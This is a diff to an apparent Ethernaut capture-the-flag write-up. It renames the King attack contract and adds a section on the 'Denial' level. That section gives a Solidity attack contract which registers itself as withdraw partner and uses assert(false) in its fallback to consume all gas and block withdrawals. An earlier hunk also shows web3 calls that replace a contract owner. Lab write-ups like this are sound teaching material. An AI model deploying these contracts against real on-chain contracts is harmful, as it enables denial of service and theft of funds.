@@ -119,7 +119,7 @@ Once the malicious user uses this smart contract to take over the "king" positio
 ```
 pragma solidity ^0.6.0;
 
-contract AttackForce {
+contract AttackKing {
     
     constructor(address payable _victim) public payable {
         _victim.call.gas(1000000).value(1 ether)("");
@@ -451,4 +451,29 @@ await web3.eth.sendTransaction({to: instance, from: player, data: replaceIndexZe
 
 // Check that owner has been replaced successfully
 await web3.eth.call({to: instance, data: ownerPayload})
+```
+
+## 20. Denial
+This level is very similar to the levels Force and King. The problem with the Denial contract is the fact that instead of transferring using `.send()` or `.transfer`() which has a limit of 2300 gas, it used `.call()` and if no limit on the gas is specified, it will send all gas along with it. So now the question is, what can you do in your fallback function to consume all the gas? `assert()` of course! 
+
+Note that you should actually also avoid using `.send()` and `.transfer()` now because of the recent Istanbul Hardfork which made 2300 gas insufficient. You can read more about this [here](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/).
+
+```
+pragma solidity ^0.6.0;
+
+contract AttackDenial {
+    
+    address public victim;
+    
+    constructor(address _victim) public payable {
+        victim = _victim;
+        bytes memory payload = abi.encodeWithSignature("setWithdrawPartner(address)", address(this));
+        victim.call(payload);
+    }
+    
+    
+    fallback() external payable {
+        assert(false);
+    }
+}
 ```
